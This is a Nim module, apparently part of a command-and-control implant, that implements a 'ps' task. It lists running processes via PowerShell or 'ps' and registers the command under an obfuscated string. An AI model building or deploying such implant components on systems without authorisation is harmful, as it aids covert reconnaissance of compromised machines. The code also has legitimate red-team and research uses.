import std/[json, osproc, strutils]
import core/types
import commands/registry
import crypto/strenc

proc psExecute(taskId: string, params: JsonNode, state: AgentState,
               send: SendMsg): TaskResult =
  let processes = newJArray()
  try:
    when defined(windows):
      # Get-CimInstance replaces WMIC (removed in Windows 11 22H2+)
      # @() forces array output even for single process
      let (raw, _) = execCmdEx(
        "powershell -NoProfile -NonInteractive -Command " &
        "\"@(Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine) | ConvertTo-Json -Depth 2\"",
        options = {poStdErrToStdOut})
      let jdata = parseJson(raw.strip())
      let arr = if jdata.kind == JArray: jdata else: newJArray()
      for obj in arr:
        processes.add(%*{
          "process_id":        obj{"ProcessId"}.getInt(0),
          "parent_process_id": obj{"ParentProcessId"}.getInt(0),
          "name":              obj{"Name"}.getStr(""),
          "bin_path":          obj{"ExecutablePath"}.getStr(""),
          "command_line":      obj{"CommandLine"}.getStr(""),
          "user":              "",
          "architecture":      "x64",
          "update_deleted":    true,
        })
    else:
      # ps -eo pid,ppid,user,comm,args --no-headers (Linux/macOS)
      let (raw, _) = execCmdEx("ps -eo pid,ppid,user,comm,args --no-headers",
                                options = {poStdErrToStdOut})
      for line in raw.splitLines():
        let s = line.strip()
        if s.len == 0: continue
        let parts = s.splitWhitespace(maxSplit = 4)
        if parts.len < 4: continue
        var pid, ppid: int
        try: pid  = parseInt(parts[0]) except: pid  = 0
        try: ppid = parseInt(parts[1]) except: ppid = 0
        let user    = parts[2]
        let name    = parts[3]
        let cmdline = if parts.len > 4: parts[4] else: name
        processes.add(%*{
          "process_id":        pid,
          "parent_process_id": ppid,
          "name":              name,
          "bin_path":          "",
          "command_line":      cmdline,
          "user":              user,
          "architecture":      "x64",
          "update_deleted":    true,
        })

    return TaskResult(
      output:      $(%*{"processes": processes}),
      status:      "success",
      completed:   true,
      extraFields: %*{"processes": processes},
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initPs*() =
  register(hidstr("ps"), psExecute)
